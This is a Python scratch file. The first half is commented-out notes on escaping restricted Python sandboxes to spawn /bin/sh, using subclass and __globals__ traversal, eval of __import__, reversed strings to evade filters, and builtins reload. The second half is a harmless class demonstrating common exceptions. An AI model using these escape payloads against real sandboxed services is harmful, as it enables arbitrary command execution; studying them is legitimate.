# import sys
import os
import csv
import io

# call /bin/sh to open a shell directly via os
# os.execv('/bin/sh', (' ',))
# sys.modules['os'].system('/bin/sh')
# eval("__import__('os').system('/bin/sh')")

# execute code from other file
# exec(open('shell.py').read())
# way without exec (compiling)
"""
this way is not working
# local
def read():
    return open('./shell.py', 'r').read()
compiledCode = read.__code__.co_code

# remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) # Get <type 'type'>
consts = (None, './shell.py', 'r')
bytecode = compiledCode
names = ('open', 'read')
# exec compiled code via eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))
"""

"""
# use dir to get properties
print(dir(__builtins__))

# get base class of an obj
print ([].__class__.__bases__[0])
print ([].__class__.__mro__[-1])

# get specific method of base class
print([].__class__.__dict__['append'])
# add element to a via method of base class
a = []
[].__class__.__dict__['append'](a, 'firstEle')
print(a)

# get subclasses of object (here the second last one)
print([].__class__.__base__.__subclasses__()[-2])
# get functions of this base class and locate __init__
print(dir([].__class__.__base__.__subclasses__()[-2]))
print([].__class__.__base__.__subclasses__()[-2].__init__)
print(dir([].__class__.__base__.__subclasses__()[-2].__init__))
# get properties of globals
print([].__class__.__base__.__subclasses__()[-2].__init__.__getattribute__('__globals__'))

# add more elements
a.__getattribute__('append')('secondEle')
a.__class__.append(a, 'thirdEle')
# print(a)

# combine both methods
# test if init method is present
print([].__class__.__dict__['__init__'])
# get access to init method
print([].__class__.__getattribute__([], '__init__'))
# get properties of __init__
print(dir([].__class__.__base__.__subclasses__()[-2].__init__))
# access sys module via globals attrib of init
[].__class__.__base__.__subclasses__()[-2].__init__.__globals__['sys'].modules['os'].system('/bin/sh')

escaping_function = lambda x:x+1
# get attribs of function
print(dir(escaping_function))
# call eval with proper import via builtins module
escaping_function.__globals__['__builtins__'].eval("__import__('os').system('/bin/sh')")
"""

"""
# fcts can be deleted
del __builtins__.__dict__['eval']
# eval("__import__('os').system('/bin/sh')")

# calling reload restores deleted functions
import imp
imp.reload(__builtins__)
eval("__import__('os').system('/bin/sh')")
# not working
"""


# fcts executing arbitray code
# import timeit
# timeit.timeit("__import__('os').system('/bin/sh')", number=1)


# reverse writings to bypass forbidden import
# getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('/bin/sh')

"""
# restore sys module
# import sys
# sys.modules['os'] = 'not allowed'
# del sys
# import sys
# sys.modules['os'].system('/bin/sh')
"""

"""
import ctypes
libc = ctypes.CDLL('libc.so.6')
libc.printf(b'Heyho from libc')
"""

# implementation of methods causing errors
# sorted after likelihood of occuring
# TheErrorLandscape

class ErrorExamples:
    
    filledDict = {
        'one': 1,
        'two': 2
    }

    arr = ['I', 'am', 'an', 'array']
    
    def __init__(self) -> None:
        pass  

    # 10.02%
    def nameError(self):
        print(hello)

    # 8.92%
    def typeError1(self, string: str):
        print(string)

    def typeError2(string: str):
        print(string)

    # 4.46%
    def keyError(self):
        print(self.filledDict['three'])

    # 4.49%
    def indexError(self):
        print(self.arr[len(self.arr)])
    
    # 2.62%
    # probably renamed in ModuleNotFoundError
    def importError(self):
        import fail
    
    # 1.92%
    def attributeError(self):
        x = 10
        x.append(5)

    # 1.31%
    # cant find this one yet
    def runtimeError(self):
        pass

    # 1.07%
    def unboundLocalError(self):
        print(msg)
        msg = 'Hello' 

    # 0.75%
    def valueError(self):
        int('string')

    # 0.20%
    def zeroDivisionError(self):
        10/0

    # 0.05%
    def assertionError(self):
        x, y = 10, 5
        assert x == y

    # 0.01%
    def exception(self):
        raise Exception('Crash')

    # 0.00%
    # cant reproduce this one
    def memoryError(self):
        x = 2
        while True:
            x = x**10
            print(x)

    # 0.00%
    def stopIteration(self):
        data = 'test.csv'
        c = csv.DictReader(io.StringIO(data), dialect=csv.excel_tab)
        keys = next(c) 

errorExamples = ErrorExamples()

# NameError: name 'hello' is not defined
# errorExamples.nameError()

# TypeError: typeError1() missing 1 required positional argument: 'string'
# errorExamples.typeError1()

# TypeError: typeError2() takes 1 positional argument but 2 were given
# errorExamples.typeError2('foo')

# IndexError: list index out of range
# errorExamples.indexError()

# UnboundLocalError: local variable 'msg' referenced before assignment
# errorExamples.unboundLocalError()

# ModuleNotFoundError: No module named 'fail'
# errorExamples.importError()

# AttributeError: 'int' object has no attribute 'append'
# errorExamples.attributeError()

# ValueError: invalid literal for int() with base 10: 'string'
# errorExamples.valueError()

# ZeroDivisionError: division by zero
# errorExamples.zeroDivisionError()

# AssertionError
# errorExamples.assertionError()

# Exception: Crash
# errorExamples.exception()

# cant be reproduced for now
# errorExamples.memoryError()

# StopIteration
# errorExamples.stopIteration()